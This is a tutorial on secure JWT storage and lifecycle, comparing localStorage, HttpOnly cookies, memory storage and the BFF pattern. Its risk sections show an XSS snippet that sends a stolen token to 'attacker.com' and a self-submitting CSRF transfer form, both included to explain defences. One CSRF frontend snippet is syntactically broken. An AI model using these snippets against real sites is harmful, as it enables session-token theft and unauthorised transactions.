## Introduction

Even perfectly signed and validated JWTs can be compromised through insecure storage or transmission. Where and how you store tokens is as critical as how you create and validate them. This lesson covers the complete lifecycle of JWT security, from creation to storage to transmission to revocation.

**Key principle:** The security of your tokens is only as strong as your weakest link in the token lifecycle.

## Storage Options Comparison

### 1. LocalStorage / SessionStorage

#### How It Works

```javascript
// Storing
localStorage.setItem('jwt', token);

// Retrieving
const token = localStorage.getItem('jwt');

// Using
fetch('/api/data', {
    headers: {
        'Authorization': `Bearer ${token}`
    }
});
```

#### Advantages

✅ Simple to implement
✅ Survives page reloads (localStorage)
✅ No CSRF risk (not automatically sent)
✅ Works with any framework

#### Disadvantages

❌ **Fully exposed to XSS attacks**
❌ Accessible to any JavaScript on the page
❌ No HttpOnly protection
❌ Persists across sessions (localStorage)

#### Security Risk

```javascript
// ANY JavaScript can steal the token
<script>
    // Injected via XSS
    var stolenToken = localStorage.getItem('jwt');
    fetch('https://attacker.com/steal?token=' + stolenToken);
</script>
```

### 2. HttpOnly Cookies

#### How It Works

```csharp
// Server sets cookie
Response.Cookies.Append("jwt", token, new CookieOptions
{
    HttpOnly = true,    // JavaScript cannot access
    Secure = true,      // HTTPS only
    SameSite = SameSiteMode.Strict,  // CSRF protection
    MaxAge = TimeSpan.FromHours(1)
});

// Browser automatically includes cookie in requests
// No JavaScript needed!
```

#### Advantages

✅ **Protected from XSS** (HttpOnly flag prevents JavaScript access)
✅ Automatically sent with requests
✅ Secure flag ensures HTTPS only
✅ SameSite protection against CSRF

#### Disadvantages

❌ Vulnerable to CSRF (even with SameSite)
❌ Requires CSRF tokens for state-changing operations
❌ More complex CORS setup
❌ Less flexible for non-browser clients

#### Security Risk

```html
<!-- CSRF attack -->
<form action="https://api.victim.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

<!-- Cookie sent automatically with request! -->
```

### 3. Memory-Only (JavaScript Variable)

#### How It Works

```javascript
// Store in memory
let accessToken = null;

async function login(username, password) {
    const response = await fetch('/api/login', {
        method: 'POST',
        body: JSON.stringify({ username, password })
    });
    
    const data = await response.json();
    accessToken = data.accessToken;  // Store in memory only
}

function callApi() {
    return fetch('/api/data', {
        headers: {
            'Authorization': `Bearer ${accessToken}`
        }
    });
}
```

#### Advantages

✅ More secure than localStorage (harder to steal)
✅ Cleared on page reload (better security)
✅ Not persisted anywhere

#### Disadvantages

❌ Lost on page reload (poor UX)
❌ Still vulnerable to XSS
❌ Requires re-authentication frequently

### 4. Backend for Frontend (BFF) Pattern

#### How It Works

```
┌─────────────┐                  ┌─────────────┐                  ┌─────────────┐
│   Browser   │                  │ BFF Server  │                  │  Auth API   │
│             │                  │             │                  │             │
│ (Session    │  ←──────────→   │ (Holds JWT) │  ←──────────→   │ (Issues JWT)│
│  Cookie)    │    Session ID    │             │   Real JWT       │             │
└─────────────┘                  └─────────────┘                  └─────────────┘
```

**Flow:**
1. User logs in via BFF server
2. BFF gets JWT from auth API
3. BFF stores JWT server-side (session)
4. BFF issues session cookie to browser
5. Browser uses session cookie (HttpOnly)
6. BFF uses stored JWT to call APIs

#### Advantages

✅ **Best security** (JWT never exposed to browser)
✅ HttpOnly cookie for session ID
✅ XSS can't steal JWT (not in browser)
✅ CSRF protection with anti-forgery tokens

#### Disadvantages

❌ More complex architecture
❌ Requires backend server
❌ Additional latency
❌ Not suitable for static sites

## Storage Decision Matrix

| Storage Method | XSS Risk | CSRF Risk | Complexity | Best For |
|----------------|----------|-----------|------------|----------|
| **localStorage** | ❌ High | ✅ None | ✅ Low | Not recommended |
| **HttpOnly Cookie** | ✅ Low | ⚠️ Medium | ⚠️ Medium | Traditional web apps |
| **Memory Only** | ⚠️ Medium | ✅ None | ⚠️ Medium | SPAs with frequent re-auth |
| **BFF Pattern** | ✅ Very Low | ✅ Low | ❌ High | Enterprise SPAs |

## Secure Storage Implementation

### HttpOnly Cookie Implementation

```csharp
// ASP.NET Core - Setting JWT in HttpOnly cookie
[HttpPost("login")]
public IActionResult Login([FromBody] LoginRequest request)
{
    // Validate credentials
    var user = ValidateCredentials(request.Username, request.Password);
    if (user == null)
        return Unauthorized();
    
    // Create JWT
    var token = CreateJwt(user.Id, user.Email);
    
    // Set HttpOnly cookie
    Response.Cookies.Append("jwt", token, new CookieOptions
    {
        HttpOnly = true,           // Prevent JavaScript access
        Secure = true,             // HTTPS only
        SameSite = SameSiteMode.Strict,  // Prevent CSRF
        MaxAge = TimeSpan.FromHours(1),
        Domain = ".example.com",   // Cookie domain
        Path = "/"
    });
    
    return Ok(new { message = "Logged in successfully" });
}

// Middleware to extract JWT from cookie
app.Use(async (context, next) =>
{
    var token = context.Request.Cookies["jwt"];
    
    if (!string.IsNullOrEmpty(token))
    {
        // Add to Authorization header for JWT middleware
        context.Request.Headers.Add("Authorization", $"Bearer {token}");
    }
    
    await next();
});

// Configure authentication
services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        // Standard JWT configuration
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuerSigningKey = true,
            IssuerSigningKey = key,
            ValidateIssuer = true,
            ValidIssuer = issuer,
            ValidateAudience = true,
            ValidAudience = audience
        };
        
        // Extract token from cookie
        options.Events = new JwtBearerEvents
        {
            OnMessageReceived = context =>
            {
                context.Token = context.Request.Cookies["jwt"];
                return Task.CompletedTask;
            }
        };
    });
```

### CSRF Protection for Cookies

```csharp
// Add anti-forgery token
services.AddAntiforgery(options =>
{
    options.HeaderName = "X-CSRF-TOKEN";
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
});

// Generate CSRF token endpoint
[HttpGet("csrf-token")]
public IActionResult GetCsrfToken()
{
    var tokens = _antiforgery.GetAndStoreTokens(HttpContext);
    
    return Ok(new { csrfToken = tokens.RequestToken });
}

// Validate CSRF token on state-changing operations
[HttpPost("api/transfer")]
[ValidateAntiForgeryToken]
public IActionResult Transfer([FromBody] TransferRequest request)
{
    // Process transfer
    return Ok();
}
```

```javascript
// Frontend: Include CSRF token
const csrfResponse = await fetch('/csrf-token');
const { csrfToken } = await csrfResponse.json();

// Include in requests
fetch('/api/transfer', {
    method: 'POST',

        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrfToken
    },
```

### BFF Pattern Implementation

```csharp
// BFF Server (ASP.NET Core)
public class BffController : Controller
{
    private readonly IHttpClientFactory _httpClientFactory;
    
    [HttpPost("login")]
    public async Task<IActionResult> Login([FromBody] LoginRequest request)
    {
        // Call auth API
        var httpClient = _httpClientFactory.CreateClient();
        var authResponse = await httpClient.PostAsJsonAsync(
            "https://auth.example.com/token", request);
        
        var tokenResponse = await authResponse.Content
            .ReadFromJsonAsync<TokenResponse>();
        
        // Store JWT in server-side session
        HttpContext.Session.SetString("access_token", tokenResponse.AccessToken);
        HttpContext.Session.SetString("refresh_token", tokenResponse.RefreshToken);
        
        // Return success (no token to browser!)
        return Ok(new { message = "Logged in" });
    }
    
    [HttpGet("api/data")]
    public async Task<IActionResult> GetData()
    {
        // Retrieve JWT from session
        var accessToken = HttpContext.Session.GetString("access_token");
        
        if (string.IsNullOrEmpty(accessToken))
            return Unauthorized();
        
        // Call actual API with JWT
        var httpClient = _httpClientFactory.CreateClient();
        httpClient.DefaultRequestHeaders.Authorization =
            new AuthenticationHeaderValue("Bearer", accessToken);
        
        var response = await httpClient.GetAsync("https://api.example.com/data");
        var data = await response.Content.ReadAsStringAsync();
        
        return Content(data, "application/json");
    }
}

// Configure session
services.AddDistributedMemoryCache();
services.AddSession(options =>
{
    options.Cookie.HttpOnly = true;
    options.Cookie.Secure = true;
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.IdleTimeout = TimeSpan.FromMinutes(30);
});

app.UseSession();
```

## Token Refresh Strategies

### Short-Lived Access Tokens + Refresh Tokens

```
Access Token: 15 minutes (short)
Refresh Token: 7 days (long, secure storage)

┌─────────────────────────────────────────────────┐
│ Flow:                                           │
├─────────────────────────────────────────────────┤
│ 1. User logs in                                 │
│ 2. Receive access token (15 min) + refresh     │
│ 3. Use access token for API calls              │
│ 4. Access token expires                         │
│ 5. Use refresh token to get new access token   │
│ 6. Continue using new access token             │
│ 7. Refresh token expires → re-authenticate     │
└─────────────────────────────────────────────────┘
```

### Implementation

```csharp
// Token endpoint
[HttpPost("token")]
public IActionResult Token([FromBody] TokenRequest request)
{
    if (request.GrantType == "password")
    {
        // Login flow
        var user = ValidateCredentials(request.Username, request.Password);
        if (user == null)
            return Unauthorized();
        
        var accessToken = CreateAccessToken(user, TimeSpan.FromMinutes(15));
        var refreshToken = CreateRefreshToken(user, TimeSpan.FromDays(7));
        
        // Store refresh token in database
        SaveRefreshToken(user.Id, refreshToken);
        
        return Ok(new
        {
            access_token = accessToken,
            refresh_token = refreshToken,
            expires_in = 900,  // 15 minutes
            token_type = "Bearer"
        });
    }
    else if (request.GrantType == "refresh_token")
    {
        // Refresh flow
        var storedToken = GetRefreshToken(request.RefreshToken);
        if (storedToken == null || storedToken.IsExpired || storedToken.IsRevoked)
            return Unauthorized();
        
        var user = GetUser(storedToken.UserId);
        
        // Create new access token
        var newAccessToken = CreateAccessToken(user, TimeSpan.FromMinutes(15));
        
        // Optionally rotate refresh token
        var newRefreshToken = CreateRefreshToken(user, TimeSpan.FromDays(7));
        RevokeRefreshToken(request.RefreshToken);
        SaveRefreshToken(user.Id, newRefreshToken);
        
        return Ok(new
        {
            access_token = newAccessToken,
            refresh_token = newRefreshToken,
            expires_in = 900,
            token_type = "Bearer"
        });
    }
    
    return BadRequest();
}
```

```javascript
// Frontend: Automatic token refresh
let accessToken = '';
let refreshToken = '';

async function refreshAccessToken() {
    const response = await fetch('/api/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            grant_type: 'refresh_token',
            refresh_token: refreshToken
        })
    });
    
    if (!response.ok) {
        // Refresh failed - redirect to login
        window.location.href = '/login';
        return null;
    }
    
    const data = await response.json();
    accessToken = data.access_token;
    refreshToken = data.refresh_token;
    
    return accessToken;
}

// Interceptor to handle expired tokens
async function apiCall(url, options = {}) {
    options.headers = {
        ...options.headers,
        'Authorization': `Bearer ${accessToken}`
    };
    
    let response = await fetch(url, options);
    
    if (response.status === 401) {
        // Token expired, try to refresh
        const newToken = await refreshAccessToken();
        
        if (newToken) {
            // Retry with new token
            options.headers['Authorization'] = `Bearer ${newToken}`;
            response = await fetch(url, options);
        }
    }
    
    return response;
}
```

## Mobile App Storage

### iOS

```swift
// Use iOS Keychain (most secure)
import Security

func saveToken(_ token: String) {
    let data = token.data(using: .utf8)!
    
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: "jwt_access_token",
        kSecValueData as String: data
    ]
    
    SecItemDelete(query as CFDictionary)
    SecItemAdd(query as CFDictionary, nil)
}

func getToken() -> String? {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: "jwt_access_token",
        kSecReturnData as String: true
    ]
    
    var item: CFTypeRef?
    let status = SecItemCopyMatching(query as CFDictionary, &item)
    
    guard status == errSecSuccess,
          let data = item as? Data,
          let token = String(data: data, encoding: .utf8) else {
        return nil
    }
    
    return token
}
```

### Android

```kotlin
// Use Android Keystore (most secure)
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey

fun saveToken(context: Context, token: String) {
    val masterKey = MasterKey.Builder(context)
        .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
        .build()
    
    val sharedPreferences = EncryptedSharedPreferences.create(
        context,
        "secure_prefs",
        masterKey,
        EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
        EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
    )
    
    sharedPreferences.edit()
        .putString("jwt_access_token", token)
        .apply()
}

fun getToken(context: Context): String? {
    val masterKey = MasterKey.Builder(context)
        .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
        .build()
    
    val sharedPreferences = EncryptedSharedPreferences.create(
        context,
        "secure_prefs",
        masterKey,
        EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
        EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
    )
    
    return sharedPreferences.getString("jwt_access_token", null)
}
```

## Comprehensive Best Practices

### 1. Token Creation

```csharp
// ✅ Best practices
var token = new JwtSecurityToken(
    issuer: "https://auth.example.com",     // Always set
    audience: "https://api.example.com",    // Always set
    claims: claims,
    notBefore: DateTime.UtcNow,             // Optional but recommended
    expires: DateTime.UtcNow.AddMinutes(15),// Short-lived
    signingCredentials: new SigningCredentials(
        key,
        SecurityAlgorithms.RsaSha256           // Strong algorithm
    )
);
```

### 2. Token Transmission

```csharp
// ✅ Always use Authorization header
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...

// ❌ Never use URL parameters
GET /api/data?token=eyJhbGciOi...  // NO!

// ✅ Always use HTTPS
app.UseHttpsRedirection();

```

### 3. Token Storage

```
Web Application:
  ✅ HttpOnly cookie + CSRF protection
  ✅ BFF pattern (best security)
  ❌ localStorage
  ❌ sessionStorage

Single Page App:
  ✅ BFF pattern (best)
  ⚠️ Memory only (acceptable)
  ⚠️ HttpOnly cookie (with CSRF)
  ❌ localStorage

Mobile App:
  ✅ iOS Keychain
  ✅ Android Keystore
  ❌ SharedPreferences (unencrypted)
  ❌ Files

API/Service:
  ✅ Environment variables
  ✅ Secret management service
  ❌ Configuration files
  ❌ Hard-coded
```

### 4. Token Revocation

```csharp
// Implement token revocation
public class TokenRevocationService
{
    private readonly IDistributedCache _cache;
    
    public async Task RevokeToken(string jti)
    {
        // Add token ID to blacklist
        var expiration = TimeSpan.FromHours(24);  // Match token lifetime
        await _cache.SetStringAsync($"revoked:{jti}", "true", 
            new DistributedCacheEntryOptions
            {
                AbsoluteExpirationRelativeToNow = expiration
            });
    }
    
    public async Task<bool> IsTokenRevoked(string jti)
    {
        var value = await _cache.GetStringAsync($"revoked:{jti}");
        return value != null;
    }
}

// Check during validation
options.Events = new JwtBearerEvents
{
    OnTokenValidated = async context =>
    {
        var jti = context.Principal.FindFirst(JwtRegisteredClaimNames.Jti)?.Value;
        
        if (jti != null)
        {
            var revocationService = context.HttpContext
                .RequestServices.GetRequiredService<TokenRevocationService>();
            
            if (await revocationService.IsTokenRevoked(jti))
            {
                context.Fail("Token has been revoked");
            }
        }
    }
};
```

## Security Checklist

### Development
- ✓ Use strong signing algorithms (RS256, ES256)
- ✓ Set short token lifetimes (≤ 1 hour)
- ✓ Implement token refresh mechanism
- ✓ Never log tokens
- ✓ Never commit secrets to version control
- ✓ Use HTTPS exclusively
- ✓ Validate all tokens completely

### Storage
- ✓ Use most secure storage for platform
- ✓ Prefer HttpOnly cookies or BFF pattern for web
- ✓ Use Keychain/Keystore for mobile
- ✓ Never use localStorage for sensitive tokens
- ✓ Implement CSRF protection for cookies

### Operations
- ✓ Rotate signing keys regularly
- ✓ Monitor token validation failures
- ✓ Implement token revocation
- ✓ Have incident response plan
- ✓ Regular security audits
